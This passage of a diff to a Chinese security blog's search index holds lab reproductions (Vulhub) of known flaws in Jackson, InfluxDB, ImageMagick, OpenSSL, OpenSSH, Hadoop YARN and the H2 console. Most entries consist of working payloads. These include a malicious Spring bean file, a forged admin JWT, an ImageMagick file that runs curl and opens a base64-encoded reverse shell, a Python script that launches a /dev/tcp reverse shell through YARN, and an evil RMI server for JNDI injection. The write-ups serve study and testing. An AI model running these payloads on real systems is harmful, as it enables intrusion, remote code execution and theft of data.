&quot;outputProperties&quot;: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210816/16291059681343.png" alt="image-20210816144118603"></p>
+<p>成功在<code>/tmp</code>中创建<code>prove1.txt</code></p>
+<p><img src="https://image.3001.net/images/20210816/16291059717590.png" alt="image-20210816151150620"></p>
+<p>这个POC只能运行在目标为JDK7u21以下的环境中，其他情况请更换Gadget。</p>
+<h3 id="CVE-2017-17485"><a href="#CVE-2017-17485" class="headerlink" title="CVE-2017-17485"></a>CVE-2017-17485</h3><p>CVE-2017-7525 <a href="https://github.com/FasterXML/jackson-databind/commit/60d459cedcf079c6106ae7da2ac562bc32dcabe1" target="_blank" rel="noopener">黑名单修复</a> 绕过，利用了 <code>org.springframework.context.support.FileSystemXmlApplicationContext</code>。</p>
+<p>利用该漏洞，我们需要创建一个bean文件，放置在任意服务器上，如<code>http://evil/spel.xml</code>，内容如下：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">     http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">     http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"pb"</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>touch<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>/tmp/prove2.txt<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"any"</span> <span class="attr">value</span>=<span class="string">"#&#123; pb.start() &#125;"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后，发送如下数据包，使Jackson加载bean，触发漏洞：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;exploit HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 138</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;param&quot;: [</span><br><span class="line">    &quot;org.springframework.context.support.FileSystemXmlApplicationContext&quot;,</span><br><span class="line">    &quot;http:&#x2F;&#x2F;192.168.44.132&#x2F;spel.xml&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功执行<code>touch /tmp/prove2.txt</code>：</p>
+<p><img src="https://image.3001.net/images/20210816/16291059748007.png" alt="image-20210816151311884"></p>
+<p><strong>原理：</strong> 利用 <code>FileSystemXmlApplicationContext</code> 加载远程 bean 定义文件，创建 ProcessBuilder bean，并在 xml 文件中使用 Spring EL 来调用 <code>start()</code> 方法实现命令执行</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization" target="_blank" rel="noopener">JacksonPolymorphicDeserialization</a></li>
+<li><a href="https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/" target="_blank" rel="noopener">Exploiting the Jackson RCE: CVE-2017-7525</a></li>
+<li><a href="https://github.com/irsl/jackson-rce-via-spel" target="_blank" rel="noopener">jackson-rce-via-spel</a></li>
+<li><a href="https://github.com/FasterXML/jackson-databind/commit/60d459cedcf079c6106ae7da2ac562bc32dcabe1" target="_blank" rel="noopener">Jackson Deserializer security vulnerability</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Jackson</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>influxdb未授权访问漏洞</title>
+    <url>/2021/08/16/influxdb%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="influxdb未授权访问漏洞"><a href="#influxdb未授权访问漏洞" class="headerlink" title="influxdb未授权访问漏洞"></a>influxdb未授权访问漏洞</h1><p>influxdb是一款著名的时序数据库，其使用jwt作为鉴权方式。在用户开启了认证，但未设置参数<code>shared-secret</code>的情况下，jwt的认证密钥为空字符串，此时攻击者可以伪造任意用户身份在influxdb中执行SQL语句。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://www.komodosec.com/post/when-all-else-fails-find-a-0-day" target="_blank" rel="noopener">https://www.komodosec.com/post/when-all-else-fails-find-a-0-day</a></li>
+<li><a href="https://docs.influxdata.com/influxdb/v1.7/administration/config/#http-endpoints-settings" target="_blank" rel="noopener">https://docs.influxdata.com/influxdb/v1.7/administration/config/#http-endpoints-settings</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问<code>http://192.168.44.132:8086/debug/vars</code>即可查看一些服务信息，但此时执行SQL语句则会出现401错误：</p>
+<p><img src="https://image.3001.net/images/20210816/16290852134513.png" alt="image-20210816110138116"></p>
+<p>我们借助<a href="https://jwt.io/来生成jwt" target="_blank" rel="noopener">https://jwt.io/来生成jwt</a> token：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;exp&quot;: 1676346267</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中，<code>admin</code>是一个已经存在的用户，<code>exp</code>是一个时间戳，代表着这个token的过期时间，你需要设置为一个未来的时间戳。</p>
+<p>最终生成的token：</p>
+<p><img src="https://image.3001.net/images/20210816/16290852174825.png" alt="image-20210816110703250"></p>
+<p>发送带有这个jwt token的数据包，可见SQL语句执行成功：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;query HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjI5MTY5NTg4fQ.pSTpKw7rLIrn5Q5Lw-bFsYlSsR0Eq3hr7v-Ur0jpIg0</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 22</span><br><span class="line"></span><br><span class="line">db&#x3D;sample&amp;q&#x3D;show+users</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210816/16290852212869.png" alt="image-20210816110858318"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>influxdb</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Imagemagick 命令注入漏洞 (CVE-2016–3714)</title>
+    <url>/2021/08/13/Imagemagick%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20(CVE-2016%E2%80%933714)/</url>
+    <content><![CDATA[<h1 id="Imagemagick-命令注入漏洞-CVE-2016–3714"><a href="#Imagemagick-命令注入漏洞-CVE-2016–3714" class="headerlink" title="Imagemagick 命令注入漏洞 (CVE-2016–3714)"></a>Imagemagick 命令注入漏洞 (CVE-2016–3714)</h1><p>ImageMagick 是一个免费的开源跨平台软件套件，用于显示、创建、转换、修改和编辑光栅图像。</p>
+<p>推荐人：</p>
+<ul>
+<li><a href="https://imagetragick.com/" target="_blank" rel="noopener">https://imagetragick.com</a></li>
+<li><a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html</a></li>
+<li><a href="https://github.com/ImageTragick/PoCs" target="_blank" rel="noopener">https://github.com/ImageTragick/PoCs</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://192.168.44.132:8080/</code>以查看上传组件。</p>
+<p>发送以下请求：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.132 Safari&#x2F;537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundarymdcbmdQR1sDse9Et</span><br><span class="line">Content-Length: 328</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarymdcbmdQR1sDse9Et</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file_upload&quot;; filename&#x3D;&quot;1.gif&quot;</span><br><span class="line">Content-Type: image&#x2F;png</span><br><span class="line"></span><br><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#39;url(https:&#x2F;&#x2F;127.0.0.0&#x2F;oops.jpg&quot;|curl &quot;192.168.44.1:8889)&#39;</span><br><span class="line">pop graphic-context</span><br><span class="line">------WebKitFormBoundarymdcbmdQR1sDse9Et--</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>192.168.44.1:8889</code>已经收到http请求，curl命令执行成功后：</p>
+<p><img src="https://image.3001.net/images/20210813/16288467309283.png" alt="image-20210813161639851"></p>
+<p>获取反向shell的POC：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#39;url(https:&#x2F;&#x2F;192.168.44.132&#x2F;oops.jpg?&#96;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDQuMS84ODg5IDA+JjE&#x3D; | base64 -d | bash&#96;&quot;||id &quot; )&#39;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210813/16288467343525.png" alt="image-20210813164511755"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>ImageMagick</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>通过 PDF 密码进行 ImageMagick Shell 注入 (CVE-2020-29599)</title>
+    <url>/2021/08/13/%E9%80%9A%E8%BF%87%20PDF%20%E5%AF%86%E7%A0%81%E8%BF%9B%E8%A1%8C%20ImageMagick%20Shell%20%E6%B3%A8%E5%85%A5%20(CVE-2020-29599)/</url>
+    <content><![CDATA[<h1 id="通过-PDF-密码进行-ImageMagick-Shell-注入-CVE-2020-29599"><a href="#通过-PDF-密码进行-ImageMagick-Shell-注入-CVE-2020-29599" class="headerlink" title="通过 PDF 密码进行 ImageMagick Shell 注入 (CVE-2020-29599)"></a>通过 PDF 密码进行 ImageMagick Shell 注入 (CVE-2020-29599)</h1><p>ImageMagick 是一个免费的开源跨平台软件套件，用于显示、创建、转换、修改和编辑光栅图像。</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html" target="_blank" rel="noopener">https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>执行以下命令进入安装Imagemagick 7.0.10-36的Linux shell：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose run im bash</span><br></pre></td></tr></table></figure>
+
+<p>进入<code>/tmp</code>目录，转换<a href="https://github.com/vulhub/vulhub/blob/master/imagemagick/CVE-2020-29599/poc.svg" target="_blank" rel="noopener">poc.svg</a>格式，触发漏洞：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@f200ec9e1c1e:&#x2F;# cd &#x2F;tmp&#x2F;</span><br><span class="line">root@f200ec9e1c1e:&#x2F;tmp# ls</span><br><span class="line">poc.svg</span><br><span class="line">root@f200ec9e1c1e:&#x2F;tmp# identify poc.svg</span><br><span class="line">poc.svg SVG 700x700 700x700+0+0 16-bit sRGB 398B 0.000u 0:00.003</span><br><span class="line">root@f200ec9e1c1e:&#x2F;tmp# convert poc.svg poc.png</span><br><span class="line">sh: 1: : Permission denied</span><br><span class="line">convert: MagickCore&#x2F;image.c:1168: DestroyImage: Assertion &#96;image !&#x3D; (Image *) NULL&#39; failed.</span><br><span class="line">Aborted</span><br><span class="line">root@f200ec9e1c1e:&#x2F;tmp# ls</span><br><span class="line">0wned  poc.svg</span><br><span class="line">root@f200ec9e1c1e:&#x2F;tmp#</span><br></pre></td></tr></table></figure>
+
+<p>命令<code>echo $(id)&gt; ./0wned</code>已成功执行：</p>
+<p><img src="https://image.3001.net/images/20210813/16288467562185.png" alt="image-20210813172351545"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>ImageMagick</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>OpenSSL Heartbleed心脏滴血漏洞 (CVE-2014-0160)</title>
+    <url>/2021/08/13/OpenSSL%20Heartbleed%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%20(CVE-2014-0160)/</url>
+    <content><![CDATA[<h1 id="OpenSSL-Heartbleed心脏滴血漏洞-CVE-2014-0160"><a href="#OpenSSL-Heartbleed心脏滴血漏洞-CVE-2014-0160" class="headerlink" title="OpenSSL Heartbleed心脏滴血漏洞 (CVE-2014-0160)"></a>OpenSSL Heartbleed心脏滴血漏洞 (CVE-2014-0160)</h1><p>Heartbleed Bug 是流行的 OpenSSL 加密软件库中的一个严重漏洞。这个弱点允许窃取在正常情况下由用于保护 Internet 的 SSL/TLS 加密保护的信息。SSL/TLS 为 Web、电子邮件、即时消息 (IM) 和某些虚拟专用网络 (VPN) 等应用程序提供 Internet 上的通信安全和隐私。</p>
+<p>Heartbleed 漏洞允许 Internet 上的任何人读取受 OpenSSL 软件易受攻击版本保护的系统的内存。这会破坏用于识别服务提供商和加密流量、用户名称和密码以及实际内容的密钥。这允许攻击者窃听通信、直接从服务和用户窃取数据并冒充服务和用户。</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://heartbleed.com/" target="_blank" rel="noopener">https://heartbleed.com/</a></li>
+<li><a href="https://filippo.io/Heartbleed" target="_blank" rel="noopener">https://filippo.io/Heartbleed</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>https://filippo.io/Heartbleed</code>查看结果：</p>
+<p><img src="https://image.3001.net/images/20210813/16288382279998.png" alt="image-20210813104441705"></p>
+<p>用 Python运行<a href="https://github.com/vulhub/vulhub/blob/master/openssl/heartbleed/ssltest.py" target="_blank" rel="noopener">ssltest.py</a>获取敏感数据（Cookie）：</p>
+<p><img src="https://image.3001.net/images/20210813/16288382309994.png" alt="image-20210813105633858"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>OpenSSL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>OpenSSH 用户名枚举漏洞（CVE-2018-15473）</title>
+    <url>/2021/08/11/OpenSSH%20%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-15473%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="OpenSSH-用户名枚举漏洞（CVE-2018-15473）"><a href="#OpenSSH-用户名枚举漏洞（CVE-2018-15473）" class="headerlink" title="OpenSSH 用户名枚举漏洞（CVE-2018-15473）"></a>OpenSSH 用户名枚举漏洞（CVE-2018-15473）</h1><p>OpenSSH 7.7前存在一个用户名枚举漏洞，通过该漏洞，攻击者可以判断某个用户名是否存在于目标主机中。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="http://openwall.com/lists/oss-security/2018/08/15/5" target="_blank" rel="noopener">http://openwall.com/lists/oss-security/2018/08/15/5</a></li>
+<li><a href="https://github.com/Rhynorater/CVE-2018-15473-Exploit" target="_blank" rel="noopener">https://github.com/Rhynorater/CVE-2018-15473-Exploit</a></li>
+<li><a href="https://www.anquanke.com/post/id/157607" target="_blank" rel="noopener">https://www.anquanke.com/post/id/157607</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，我们在客户端执行<code>ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@192.168.44.132 -p20022</code>，输入密码<code>vulhub</code>，即可登录到容器中。</p>
+<p><img src="https://image.3001.net/images/20210811/16286741975302.png" alt="image-20210811163607264"></p>
+<p>使用<a href="https://github.com/Rhynorater/CVE-2018-15473-Exploit" target="_blank" rel="noopener">CVE-2018-15473-Exploit</a>，枚举字典中的用户名：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sshUsernameEnumExploit.py --port 20022 --userList exampleInput.txt 192.168.44.132</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210811/16286742008682.png" alt="image-20210811171157046"></p>
+<p>可见，<code>root</code>是存在的用户，<code>rootInvalid</code>是不存在的用户。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>OpenSSH</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hadoop YARN ResourceManager 未授权访问</title>
+    <url>/2021/08/11/Hadoop%20YARN%20ResourceManager%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
+    <content><![CDATA[<h1 id="Hadoop-YARN-ResourceManager-未授权访问"><a href="#Hadoop-YARN-ResourceManager-未授权访问" class="headerlink" title="Hadoop YARN ResourceManager 未授权访问"></a>Hadoop YARN ResourceManager 未授权访问</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>参考 [<a href="http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf]" target="_blank" rel="noopener">http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf]</a>(<a href="http://archive.hack.lu/2016/Wavestone" target="_blank" rel="noopener">http://archive.hack.lu/2016/Wavestone</a> - Hack.lu 2016 - Hadoop safari - Hunting for vulnerabilities - v1.0.pdf)</p>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问<code>http://192.168.44.132:8088</code>即可看到Hadoop YARN ResourceManager WebUI页面。</p>
+<p><img src="https://image.3001.net/images/20210811/16286707712132.png" alt="image-20210811153137527"></p>
+<p>通过REST API提交任务执行<br>申请新的application：<code>http://192.168.44.132:8088/ws/v1/cluster/apps/new-application</code></p>
+<p><img src="https://image.3001.net/images/20210811/16286707746313.png" alt="image-20210811153155733"></p>
+<p>更多的提交方法可参考：</p>
+<blockquote>
+<p><a href="https://hadoop.apache.org/docs/r2.7.3/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html" target="_blank" rel="noopener">https://hadoop.apache.org/docs/r2.7.3/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html</a></p>
+</blockquote>
+<p>本地监听9999端口，等待反弹shell连接</p>
+<p>exp如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">target &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1:8088&#x2F;&#39;</span><br><span class="line">lhost &#x3D; &#39;192.168.44.1&#39; # put your local host ip here, and listen at port 9999</span><br><span class="line"></span><br><span class="line">url &#x3D; target + &#39;ws&#x2F;v1&#x2F;cluster&#x2F;apps&#x2F;new-application&#39;</span><br><span class="line">resp &#x3D; requests.post(url)</span><br><span class="line">app_id &#x3D; resp.json()[&#39;application-id&#39;]</span><br><span class="line">url &#x3D; target + &#39;ws&#x2F;v1&#x2F;cluster&#x2F;apps&#39;</span><br><span class="line">data &#x3D; &#123;</span><br><span class="line">    &#39;application-id&#39;: app_id,</span><br><span class="line">    &#39;application-name&#39;: &#39;get-shell&#39;,</span><br><span class="line">    &#39;am-container-spec&#39;: &#123;</span><br><span class="line">        &#39;commands&#39;: &#123;</span><br><span class="line">            &#39;command&#39;: &#39;&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;%s&#x2F;9999 0&gt;&amp;1&#39; % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#39;application-type&#39;: &#39;YARN&#39;,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json&#x3D;data)</span><br></pre></td></tr></table></figure>
+
+<p>然后运行exp脚本，反弹shell，成功获取shell</p>
+<p><img src="https://image.3001.net/images/20210811/16286707779266.png" alt="image-20210811153733797"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Hadoop</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>H2 数据库 Web 控制台未授权访问</title>
+    <url>/2021/08/10/H2%20%E6%95%B0%E6%8D%AE%E5%BA%93%20Web%20%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
+    <content><![CDATA[<h1 id="H2-数据库-Web-控制台未授权访问"><a href="#H2-数据库-Web-控制台未授权访问" class="headerlink" title="H2 数据库 Web 控制台未授权访问"></a>H2 数据库 Web 控制台未授权访问</h1><p>H2 数据库是 Java 中的嵌入式内存数据库。带有 h2 数据库的 Springboot 带有一个 web 管理页面，如果您设置以下选项，则该页面没有身份验证：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">spring.h2.console.enabled&#x3D;true</span><br><span class="line">spring.h2.console.settings.web-allow-others&#x3D;true</span><br></pre></td></tr></table></figure>
+
+<p>该管理页面支持使用JNDI加载JDBC驱动，可以通过远程类加载实现远程代码执行。</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&amp;mid=2247483658&amp;idx=1&amp;sn=584710da0fbe56c1246755147bcec48e" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&amp;mid=2247483658&amp;idx=1&amp;sn=584710da0fbe56c1246755147bcec48e</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>启动容器后，spring-boot正在监听<code>http://192.168.44.132:8080</code>，管理页面<code>http://192.168.44.132:8080/h2-console/</code>默认。</p>
+<p>参考*<a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">在 Java 中利用 JNDI 注入</a>*，我们应该在 Java 8u191 之后使用<code>org.apache.naming.factory.BeanFactory</code>和<code>javax.el.ELProcessor</code>启动外部进程：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilRMIServerNew</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Creating evil RMI registry on port 1097"</span>);</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1097</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">"javax.el.ELProcessor"</span>, <span class="keyword">null</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="keyword">true</span>,<span class="string">"org.apache.naming.factory.BeanFactory"</span>,<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"forceString"</span>, <span class="string">"x=eval"</span>));</span><br><span class="line">        <span class="comment">//expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"x"</span>, <span class="string">"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','nslookup jndi.s.artsploit.com']).start()\")"</span>));</span><br><span class="line"></span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">"Object"</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只需使用此工具*<a href="https://github.com/JosephTribbianni/JNDI" target="_blank" rel="noopener">JNDI</a>*即可利用该漏洞。首先，在<code>config.properties</code>将目标命令设置为<code>touch /tmp/success</code>：</p>
+<p><img src="https://image.3001.net/images/20210811/16286706951556.png" alt="image-20210811144412433"></p>
+<p>然后开始<code>JNDI-1.0-all.jar</code>，就是会听<code>0.0.0.0:23456</code>。根据以下信息填写表格：</p>
+<p><img src="https://image.3001.net/images/20210811/1628670698724.png" alt="image-20210811145426248"></p>
+<p><code>javax.naming.InitialContext</code>是 JNDI 工厂类名，URL<code>rmi://evil:23456/BypassByEL</code>是恶意的 RMI 地址。</p>
+<p>Evil RMI 服务器收到请求：</p>
+<p><img src="https://image.3001.net/images/20210811/16286707012128.png" alt="image-20210811150116259"></p>
+<p><code>touch /tmp/success</code> 已经成功执行：</p>
+<p><img src="https://image.3001.net/images/20210811/16286707054100.png" alt="image-20210811150130834"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>spring</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Gogs 任意用户登录漏洞（CVE-2018-18925）</title>
+    <url>/2021/08/05/Gogs%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-18925%EF%BC%89/</url>
